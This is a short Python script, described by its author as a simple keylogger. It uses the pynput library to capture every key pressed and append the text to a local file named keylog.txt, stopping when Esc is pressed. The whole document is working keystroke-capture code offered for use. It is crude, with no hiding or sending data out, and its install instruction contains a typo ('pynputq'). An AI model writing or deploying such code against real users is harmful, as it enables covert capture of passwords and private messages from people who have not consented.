'''
Developed by Orlando Companioni

This is a simple keylogger that logs the keys pressed and saves them in a file.
Dont forget to install and import the pynput library.
 use: pip install pynputq
'''
from pynput import keyboard #importing the pynput library

def main():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release) 
    #This function starts the listener
    listener.start()
    input()


def on_press(key):
    #This function logs the keys pressed
    #The numbers are in a list because they are not characters
    numbers=["<96>","<97>","<98>","<99>","<100>","<101>","<102>","<103>","<104>","<105>"]
    print(f"{key} pressed")
    with open('keylog.txt', 'a') as log: # this opensthe file as append and closes the file once its finished
        try:
            if str(key) not in numbers:
                log.write(str(key.char)) #If the key is a character it will be logged as a string
            else :
                number=convert(key)
                log.write(number) #If the key is a number it will be logged as a string
        except AttributeError: 
            #If a special key is pressed, it will be logged as a string
            if key == key.space:
                #If its a space key it will put a new line
                log.write("\n")
            elif key == key.enter:
                log.write("\n")
            elif key == key.backspace:
                log.write("|b|")# to know there was a backspace and to erase the previous character when reading it
            elif key == key.tab:
                log.write(" ")

def convert(key): #This converts the key to a number and returns it
    numConvert = {"<96>":"0","<97>":"1","<98>":"2","<99>":"3","<100>":"4","<101>":"5","<102>":"6","<103>":"7","<104>":"8","<105>":"9"}
    if str(key) in numConvert:
        return numConvert[str(key)]
            
            
def on_release(key): 
    #This functions stops the listener when the esc key is pressed
    if key == keyboard.Key.esc:
        return False
    
if __name__ == '__main__': 
    main()


